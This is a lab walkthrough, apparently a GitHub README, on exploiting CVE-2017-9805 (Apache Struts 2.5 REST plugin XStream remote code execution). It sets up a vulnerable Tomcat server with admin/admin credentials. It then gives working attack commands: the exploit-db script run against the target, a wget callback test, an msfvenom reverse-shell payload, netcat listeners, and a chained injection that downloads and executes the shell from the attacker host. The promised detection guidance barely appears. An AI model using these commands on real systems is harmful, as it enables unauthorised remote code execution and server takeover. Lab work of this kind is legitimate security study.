## Apache-Struts-2.5-2.5.12---REST-Plugin-XStream-Remote-Code-Execution

`CVE-2017-9805` is yet another very legitimate vulnerability in the Apache Struts framework. Here I show you how easy it is to run a simple public `python script` against a vulnerable remote server, ultimately resulting in a reverse shell back to the attacker.

I have covered all the steps in this report with all the steps needed to create a vulnerable server and touch on a some basic indicators for detecting this type of activity in your own environment.

### Vulnerable Struts Package:
http://archive.apache.org/dist/struts/2.5/

### Exploit:
https://www.exploit-db.com/exploits/42627/

### Building a Vulnerable Server

I have used two virtual machines, one of them's running **Ubuntu 16.04.2** and that's gonna be my Apache struts machine otherwise the `target` and then the other one is running **Kali Linux** as my `attacker machine`.

First I installed `Tomcat 8` and `Java 1.8` to the `ubuntu machine` and only other thing needed to create a vulnerable server is to deploy the `vulnerable struts2-rest-showcase` application.

1. Install Tomcat 8:
**# sudo apt-get install tomcat8 tomcat8-admin**

2.  Now open the configuration file to add an admin user to Tomcat:
**# sudo nano /etc/tomcat8/tomcat-users.xml**

Add the following lines into the tomcat-users.xml 

`<?xml version="1.0" encoding="UTF-8"?>`

`<tomcat-users>`

`<role rolename="manager-gui"/>`

`<role rolename="manager-script"/>`

`<role rolename="manager-jmx"/>`

`<role rolename="manager-status"/>`

`<role rolename="admin-gui"/>`

`<role rolename="admin-script"/>`

`<user username="admin" password="admin" roles="manager-gui, manager-script, manager-jmx, manager-status, admin-gui, admin-script"/>`

`</tomcat-users>`


3. Restart Tomcat: 
**# systemctl restart tomcat8**

![5](https://user-images.githubusercontent.com/41302499/81815142-44572580-9547-11ea-9919-b91df3eab037.PNG)


4. Verifying the server is up and running:
**# systemctl status tomcat8**

![1](https://user-images.githubusercontent.com/41302499/81815052-27baed80-9547-11ea-925d-ecfe4a303bb1.PNG)


5. Then verify that it's listening on the port  which should be 8080:
**# netstat -antp lgrep :8080**

![2](https://user-images.githubusercontent.com/41302499/81816325-cd229100-9548-11ea-8a0e-daf3322733c0.PNG)

![2 2](https://user-images.githubusercontent.com/41302499/81816379-df043400-9548-11ea-9e74-41e343ced453.PNG)

6. Run an ifconfig and get the IP address of the server and you'll see that my IP address is going to be 192 168 238.130
**# ifconfig**

![3](https://user-images.githubusercontent.com/41302499/81816648-45895200-9549-11ea-9a06-a45171321d1a.PNG)


7. Next in kali machine, run ifconfig, and you will se its ip address as 192.168.238.128. Its my attacker machine's IP address. 
**# ifconfig**

![4](https://user-images.githubusercontent.com/41302499/81816980-ad3f9d00-9549-11ea-95ab-3c64853e5398.PNG)


8. Download the Apache Struts Package, do this step on another machine with a GUI as we will need to upload these files via browser later: 

http://archive.apache.org/dist/struts/2.5/struts-2.5-all.zip


9. Log into the Tomcat Manager:
**http://<IP_OF_TOMCAT_SERVER>:8080/manager/html**

since we know the target IP, we can easily do it by browsing to the IP address of our target server or the strut server which is going to be that 192 168 238.130 specifying the port 8080.

![6](https://user-images.githubusercontent.com/41302499/81817308-2d660280-954a-11ea-9e2f-5ad0953e0419.PNG)

This is the first part to getting this exploit to run. so first we need to get Tomcat running and then we need to deploy an Apache struts application on top of that Tomcat instance.


10. Deploy the struts2-rest-showcase.war (found in the apps folder of the struts-2.5-all.zip) via the Tomcat Manager.

![11](https://user-images.githubusercontent.com/41302499/81817465-64d4af00-954a-11ea-932d-629cd1033734.PNG)

Next get the  exploit from exploit DB and it's a python-based scrip. it's going to do is do a post request against the the target server with a command that we want in a specially formed `XML` request.

The `struts rest showcase war` is the file that we want to use. If you click on the link it will actually take you to the application and you'll see that it has a list of orders here and if we go ahead and click view on one of these orders you'll notice that the the URL at the top there is actually the same one that's referenced in the the exploit itself.

![12](https://user-images.githubusercontent.com/41302499/81818099-34d9db80-954b-11ea-8b5d-7ac34dcc173a.PNG)

![13](https://user-images.githubusercontent.com/41302499/81818109-3905f900-954b-11ea-8e03-17a9e33a3a0e.PNG)

The server should now be ready.

### Testing and Exploiting the Vulnerability

**Summary**

IP | Role | Notes
------------ | -------------
192.168.238.128 | Attacker | Kali Machine
192.168.238.130 | Target | Ubuntu machine running Apache Struts


Then we need to test the exploit and see if it actually works against the vulnerable server. Then I'm gonna actually SSH into my struts host.

**ssh  paba@192.168.238.130**

![15](https://user-images.githubusercontent.com/41302499/81821039-0958f000-954f-11ea-9901-8fb737532e5d.PNG)


Using the python script from exploit-db to target the struts application at the following URL, lets try to have the target wget a file from the attacker machine:

**# python 42627.py http://192.168.238.130:8080/struts2-rest-showcase/orders/3 “wget http://192.168.238.128/fake.php”**

I'm basically just gonna run Python and call the Python script that I downloaded from exploit DB and I'm gonna point it to the the first argument is going to be the target website or from the the actual URL that I found earlier.

You can use any of the order IDs it should work against because it's all the same application so we're gonna go with the order number 3.

Here I have used `fake.php` file. Last one is going to be the command that I want to run or have the server run for me. That's the IP address of the kali machine that I'm attacking from. Actually `fake.php` doesnet want to exists. 

What we want to know is whether it actually runs the command and makes a connection back to the Kali machine.  

Because with this particular vulnerability we won't actually see output in the error page or in the response that the server has.  

So in this way  at least we can see that the server did something by  connecting back to the Kali machine.

To test without running a web server like Apache on the local attacker machine, simply catch the wget by setting up a netcat listener on port 80:

**# nc -nvlp 80**

![18](https://user-images.githubusercontent.com/41302499/81821278-4fae4f00-954f-11ea-92b2-5bafc653c429.PNG)

![23](https://user-images.githubusercontent.com/41302499/81821435-779db280-954f-11ea-8841-074fb9a937d8.PNG)


Next I run `Python script` and then the first arguments gonna be the `target URL` and then the last arguments going to be the commands that we want to run and that's going to be the `Wget` back to the Kali machine. Then we see that it does actually run the command.

**# **

We can see an HTTP request the to the Kali machine from the struts machine and it was requesting the fake PHP and if we take a look at the Tomcat logs on the struts machine, you'll see that it actually recorded,  that the the attacker IP made a post request that returned to internal 500 error against that Apache struts application.


Now that we know the server will run commands for us, lets take things a step further and get a reverse shell.

Using `MSFVenom`, create a basic reverse shell that will connect back to the attacker over 443 and save it locally on the attacking machine in Apache’s root directory:

**# msfvenom -p linux/x86/shell_reverse_tcp -f elf LHOST=192.168.238.128 LPORT=443 -o /var/www/html/rev_shell**

Note: Make sure to start Apache at this point if it is not already running.

![24](https://user-images.githubusercontent.com/41302499/81821609-acaa0500-954f-11ea-998a-5de76f2fc707.PNG)

![25](https://user-images.githubusercontent.com/41302499/81821666-bdf31180-954f-11ea-887d-ae357fb3fb92.PNG)


Next we are going to use the python exploit to run a series of commands in one big injection. 

This part has to be done in one request, the commands can not be entered one at a time. 

Also, this is still entirely blind and no output will be visible from the commands, so there will be some trial and error. 

In order to get the reverse shell on the target server and running, this one liner will need to do the following:

* CD to a directory that is writable by tomcat

* Wget the reverse shell executable from our attacking machine to the writable directory

* Chmod the file to make it executable

* Run the executable

First, get a netcat listener ready on the attacking machine to catch reverse shell that is about to be connecting back:

**# nc -nvlp 443**

Now run the python exploit with the new commands from the attacking machine:

**# python 42627.py http://192.168.238.130:8080/struts2-rest-showcase/orders/3 “cd /dev/shm && wget http://192.168.238.128/rev_shell && chmod +x rev_shell && ./rev_shell”**

The &&’s have to be XML encoded or they will not be parsed correctly and the injection will not run as expected.

We should now have a reverse shell running as the tomcat user. 




